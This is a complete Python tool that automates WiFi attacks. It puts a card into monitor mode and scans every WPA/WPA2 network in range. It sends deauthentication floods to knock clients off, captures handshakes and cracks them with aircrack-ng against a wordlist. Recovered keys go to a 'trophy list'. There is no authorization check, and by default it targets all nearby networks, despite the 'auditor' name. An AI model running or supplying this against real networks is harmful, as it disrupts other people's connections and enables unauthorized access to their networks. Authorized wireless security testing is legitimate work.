import subprocess
import os
import time
import csv
import signal
import sys
import glob
import shutil
import argparse

INTERFACE_DEFAULT = "wlan1"
WORDLIST_DEFAULT = "/usr/share/wordlists/rockyou.txt"
SCAN_TIMEOUT = 15
CAPTURE_TIMEOUT_DEFAULT = 60
DEAUTH_PACKETS = 10
TEMP_DIR = "audit_temp"
HANDSHAKES_DIR = "handshakes"
CRACKED_PASSWORDS_FILE = "cracked_passwords.txt"
LOG_FILE = "audit.log"

ACTIVE_PROCS = []
ORIGINAL_MODE_RESTORE = None

def log(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(formatted_msg + "\n")
    except Exception:
        pass

def run_cmd(cmd, check=True):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
        return result.stdout
    except subprocess.CalledProcessError as e:
        log(f"Error executing: {cmd}\n{e.stderr}")
        return None

def check_dependencies():
    tools = ["aircrack-ng", "aireplay-ng", "timeout", "iwconfig"]
    missing = [tool for tool in tools if shutil.which(tool) is None]
    if missing:
        log(f"CRITICAL: Missing required tools: {', '.join(missing)}")
        sys.exit(1)
    log("All dependencies verified.")

def kill_subprocesses():
    for proc in ACTIVE_PROCS:
        if proc.poll() is None:
            try:
                os.kill(proc.pid, signal.SIGINT)
                proc.wait(timeout=5)
            except Exception:
                try:
                    os.kill(proc.pid, signal.SIGTERM)
                except Exception:
                    pass
    ACTIVE_PROCS.clear()

def cleanup(signum=None, frame=None):
    if signum:
        log(f"\nCaught signal {signum}. Cleaning up...")
    
    kill_subprocesses()
    
    if ORIGINAL_MODE_RESTORE:
        log(f"Restoring interface {ORIGINAL_MODE_RESTORE} to managed mode...")
        run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} down", check=False)
        run_cmd(f"iw dev {ORIGINAL_MODE_RESTORE} set type managed", check=False)
        run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} up", check=False)

    if signum:
        sys.exit(1)

def get_monitor_interface(args):
    global ORIGINAL_MODE_RESTORE
    iface = args.interface

    if not iface:
        output = run_cmd("iwconfig 2>/dev/null", check=False)
        if output:
            for line in output.splitlines():
                if line and not line.startswith(" "):
                    current_iface = line.split()[0]
                if current_iface and ("Mode:Monitor" in line or "Mode: Monitor" in line):
                    log(f"Detected monitor mode interface: {current_iface}")
                    return current_iface
            
            available_ifaces = []
            for line in output.splitlines():
                if line and not line.startswith(" ") and "no wireless extensions" not in line:
                    iface_name = line.split()[0]
                    if iface_name:
                        available_ifaces.append(iface_name)
            
            if INTERFACE_DEFAULT in available_ifaces:
                iface = INTERFACE_DEFAULT
            elif available_ifaces:
                iface = available_ifaces[0]
            else:
                log("CRITICAL: No wireless interfaces detected on the system.")
                sys.exit(1)
            
            log(f"Auto-selected fallback interface: {iface}")
        else:
            log("CRITICAL: Failed to run iwconfig to detect interfaces.")
            sys.exit(1)

    log(f"Checking specified interface: {iface}")
    output = run_cmd(f"iwconfig {iface} 2>/dev/null", check=False)
    
    if output and ("Mode:Monitor" in output or "Mode: Monitor" in output):
        log(f"Interface {iface} is already in monitor mode.")
        return iface
        
    log(f"Interface {iface} is in Managed mode. Attempting to switch to Monitor mode...")
    
    run_cmd(f"ip link set {iface} down", check=False)
    run_cmd(f"iw dev {iface} set type monitor", check=False)
    run_cmd(f"ip link set {iface} up", check=False)
    
    check_out = run_cmd(f"iwconfig {iface} 2>/dev/null", check=False)
    if check_out and ("Mode:Monitor" in check_out or "Mode: Monitor" in check_out):
        log(f"Successfully switched {iface} to monitor mode.")
        ORIGINAL_MODE_RESTORE = iface
        return iface
    else:
        log(f"CRITICAL: Failed to put {iface} into monitor mode. Your card may not support it.")
        sys.exit(1)

def parse_scan_csv(csv_file, args):
    targets = []
    if not os.path.exists(csv_file): return targets
    
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            
        ap_lines = []
        for line in lines:
            if "Station MAC" in line:
                break
            if line.strip() == "":
                continue
            ap_lines.append(line)

        if not ap_lines: return targets

        reader = csv.DictReader(ap_lines)
        for row in reader:
            bssid = row.get('BSSID', '').strip()
            channel = row.get(' channel', row.get('channel', '')).strip()
            essid = row.get(' ESSID', row.get('ESSID', '')).strip()
            privacy = row.get(' Privacy', row.get('Privacy', '')).strip()
            power = row.get(' Power', row.get('Power', '-100')).strip()
            
            try:
                power_val = int(power)
            except ValueError:
                power_val = -100

            if bssid and channel and "WPA" in privacy:
                
                if args.target and args.target not in (essid, bssid):
                    continue
                    
                if power_val < args.min_signal:
                    continue
                    
                targets.append({
                    'bssid': bssid,
                    'channel': channel,
                    'essid': essid,
                    'power': power_val
                })
    except Exception as e:
        log(f"Error parsing scan CSV: {e}")
        
    targets.sort(key=lambda x: x['power'], reverse=True)
    return targets

def get_active_clients(csv_file, target_bssid):
    clients = []
    if not os.path.exists(csv_file): return clients
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        in_client_section = False
        for line in lines:
            if "Station MAC" in line:
                in_client_section = True
                continue
            if in_client_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 6:
                    client_mac = parts[0].strip()
                    bssid = parts[5].strip()
                    if bssid == target_bssid and client_mac != target_bssid:
                        clients.append(client_mac)
    except Exception:
        pass
    return clients

def has_handshake(cap_file):
    output = run_cmd(f"aircrack-ng {cap_file}", check=False)
    return output and "1 handshake" in output

def run_auditor(args):
    if os.geteuid() != 0:
        print("This script must be run with sudo.")
        sys.exit(1)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    log("=== Autonomous WiFi Auditor Initialized ===")
    
    try:
        check_dependencies()

        if not os.path.exists(args.wordlist):
            log(f"CRITICAL: Wordlist not found at {args.wordlist}")
            sys.exit(1)

        os.makedirs(TEMP_DIR, exist_ok=True)
        os.makedirs(HANDSHAKES_DIR, exist_ok=True)
        
        interface = get_monitor_interface(args)

        log(f"Phase 1: Starting broad scan ({SCAN_TIMEOUT}s)...")
        scan_id = int(time.time())
        scan_prefix = os.path.join(TEMP_DIR, f"scan_{scan_id}")
        scan_cmd = f"timeout --signal=SIGINT {SCAN_TIMEOUT}s airodump-ng -w {scan_prefix} --output-format csv {interface} < /dev/null > /dev/null 2>&1"
        run_cmd(scan_cmd, check=False)

        targets = parse_scan_csv(f"{scan_prefix}-01.csv", args)

        if not targets:
            log("No capable WPA/WPA2 targets found matching criteria.")
            return

        log(f"Phase 2: Targeted capture starting for {len(targets)} networks...")

        captured_caps = []
        for target in targets:
            clean_essid = "".join([c if c.isalnum() else "_" for c in target['essid']]) or "unknown"
            expected_save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{target['bssid'].replace(':', '')}.cap")
            
            if os.path.exists(expected_save_path) and has_handshake(expected_save_path):
                log(f"Skipping capture: Valid handshake already secured for {target['essid']}.")
                captured_caps.append(expected_save_path)
                continue
                
            log(f"Locking on: {target['essid']} ({target['bssid']}) | PWR: {target['power']} | CH: {target['channel']}")
            
            cap_prefix = os.path.join(TEMP_DIR, f"cap_{target['bssid'].replace(':', '')}")
            dump_cmd = f"timeout --signal=SIGINT {args.timeout}s airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_prefix} --output-format pcap,csv {interface} < /dev/null > /dev/null 2>&1"
            
            dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            ACTIVE_PROCS.append(dump_proc)
            
            start_time = time.time()
            handshake_found = False
            last_deauth = 0
            
            while time.time() - start_time < args.timeout:
                cap_files = glob.glob(f"{cap_prefix}-*.cap")
                if cap_files:
                    current_cap = sorted(cap_files)[-1]
                    if has_handshake(current_cap):
                        log(f"Success! Handshake secured for {target['essid']}.")
                        
                        shutil.copy(current_cap, expected_save_path)
                        log(f"Capture archived: {expected_save_path}")
                        
                        captured_caps.append(expected_save_path)
                        handshake_found = True
                        kill_subprocesses()
                        break
                
                if time.time() - last_deauth > 15:
                    csv_files = glob.glob(f"{cap_prefix}-*.csv")
                    clients = []
                    if csv_files:
                        clients = get_active_clients(sorted(csv_files)[-1], target['bssid'])
                    
                    if clients:
                        for client in set(clients):
                            log(f"Targeted deauth: Prodding client {client} on {target['essid']}...")
                            run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} -c {client} {interface} < /dev/null > /dev/null 2>&1", check=False)
                    else:
                        log(f"No clients seen yet. Sending broadcast deauth to {target['essid']}...")
                        run_cmd(f"aireplay-ng -0 {DEAUTH_PACKETS} -a {target['bssid']} {interface} < /dev/null > /dev/null 2>&1", check=False)
                    
                    last_deauth = time.time()

                time.sleep(2)
            
            if not handshake_found:
                log(f"Incomplete: {target['essid']} remains elusive.")
                kill_subprocesses()

        if args.skip_crack:
            log("Phase 3: Skipping crack phase as requested.")
            return

        if captured_caps:
            log(f"Phase 3: Initiating batch crack on {len(captured_caps)} handshakes using Aircrack-ng...")
            
            print("\n" + "="*50)
            print("HANDING OVER TERMINAL TO AIRCRACK-NG")
            print("="*50 + "\n")
            
            cracked_count = 0
            
            for cap in captured_caps:
                essid = os.path.basename(cap).split('_')[0] 
                log(f"Cracking target: {essid}...")
                
                temp_key_file = os.path.join(TEMP_DIR, f"{essid}_key.txt")
                if os.path.exists(temp_key_file):
                    os.remove(temp_key_file)
                
                crack_cmd = f"aircrack-ng -w {args.wordlist} -l {temp_key_file} {cap}"
                
                try:
                    subprocess.call(crack_cmd, shell=True)
                except KeyboardInterrupt:
                    print(f"\n[SYSTEM] Aircrack-ng interrupted for {essid}. Moving to next target...")
                    continue
                
                if os.path.exists(temp_key_file):
                    with open(temp_key_file, 'r') as f:
                        password = f.read().strip()
                        
                    if password:
                        log(f"VICTORY! [{essid}] Key found: {password}")
                        with open(CRACKED_PASSWORDS_FILE, "a") as cpf:
                            cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | Key: {password}\n")
                        cracked_count += 1
                    
                    os.remove(temp_key_file)
                else:
                    log(f"Failed to crack {essid}.")
            
            print("\n" + "="*50)
            print("AIRCRACK-NG ENGINE FINISHED - RESUMING SCRIPT")
            print("="*50 + "\n")
            
            log(f"Batch assault complete. Passwords recovered: {cracked_count}.")
            if cracked_count > 0:
                log(f"Trophy list available at: {CRACKED_PASSWORDS_FILE}")
        else:
            log("No handshakes were secured during this foray.")

    finally:
        cleanup()
        log("=== Audit Session Concluded ===")

def parse_args():
    parser = argparse.ArgumentParser(
        description="StormCracker Autonomous WiFi Auditor",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Examples:\n"
               "  Autonomous Run:      sudo python3 wifi_auditor.py\n"
               "  Target Specific AP:  sudo python3 wifi_auditor.py -t 'My Network'\n"
               "  Filter Weak Signals: sudo python3 wifi_auditor.py -s -70\n"
               "  Capture Only:        sudo python3 wifi_auditor.py --skip-crack"
    )
    
    parser.add_argument("-i", "--interface", help="Monitor mode interface to use (e.g., wlan1)")
    parser.add_argument("-w", "--wordlist", default=WORDLIST_DEFAULT, help=f"Path to wordlist (default: {WORDLIST_DEFAULT})")
    parser.add_argument("-t", "--target", help="Specific ESSID or BSSID to target")
    parser.add_argument("-s", "--min-signal", type=int, default=-100, help="Minimum signal strength (default: -100 to capture everything)")
    parser.add_argument("--timeout", type=int, default=CAPTURE_TIMEOUT_DEFAULT, help=f"Capture timeout per target in seconds (default: {CAPTURE_TIMEOUT_DEFAULT})")
    parser.add_argument("--skip-crack", action="store_true", help="Skip Hashcat cracking phase after capture")
    
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    
    if os.environ.get("WIFI_AUDITOR_INHIBITED") != "1":
        print("[SYSTEM] Engaging Wake Lock to prevent sleep...")
        cmd = [
            "systemd-inhibit",
            "--what=sleep:idle",
            "--who=WiFi Auditor",
            "--why=Running long security audit",
            sys.executable
        ] + sys.argv
        
        env = os.environ.copy()
        env["WIFI_AUDITOR_INHIBITED"] = "1"
        
        try:
            result = subprocess.run(cmd, env=env)
            sys.exit(result.returncode)
        except FileNotFoundError:
            print("[SYSTEM] systemd-inhibit not found. Wake lock disabled. Running normally...")
            run_auditor(args)
        except KeyboardInterrupt:
            sys.exit(130)
    else:
        run_auditor(args)
